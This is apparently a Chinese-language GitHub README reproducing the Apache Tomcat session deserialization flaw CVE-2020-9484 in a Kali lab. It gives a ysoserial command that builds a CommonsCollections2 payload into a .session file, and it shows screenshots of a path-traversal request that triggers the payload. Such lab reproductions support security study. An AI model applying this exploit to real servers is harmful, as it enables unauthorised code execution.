# CVE-2020-9484
用Kali 2.0复现Apache Tomcat Session反序列化代码执行漏洞 CVE-2020-9484
## 环境：
1.	Kali 2.0
2.	apache-tomcat-7.0.61-CVE-2020-9484.tar.gz（webapp是s2-053，在其lib下加了commons-collections4-4.0.jar）
<br><br>
## 启动
/yourtomcatdir/bin/startup.sh
![image](https://github.com/IdealDreamLast/CVE-2020-9484/blob/master/img/start.png)
<br><br>
## 生成payload
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 "touch /tmp/9484" > /tmp/22222.session
<br><br>
## 利用

先访问S2-053看是否启动正常：
http://192.168.152.128:8080/s2-053/
![image](https://github.com/IdealDreamLast/CVE-2020-9484/blob/master/img/s2-053.png)
<br>
重新访问抓包，用intruder进行路径遍历
![image](https://github.com/IdealDreamLast/CVE-2020-9484/blob/master/img/intruder1.png)<br>
![image](https://github.com/IdealDreamLast/CVE-2020-9484/blob/master/img/intruder2.png)

<br>

执行命令成功：
![image](https://github.com/IdealDreamLast/CVE-2020-9484/blob/master/img/ok.png)

<br>
<br>
Reference ：  https://mp.weixin.qq.com/s/OGdHSwqydiDqe-BUkheTGg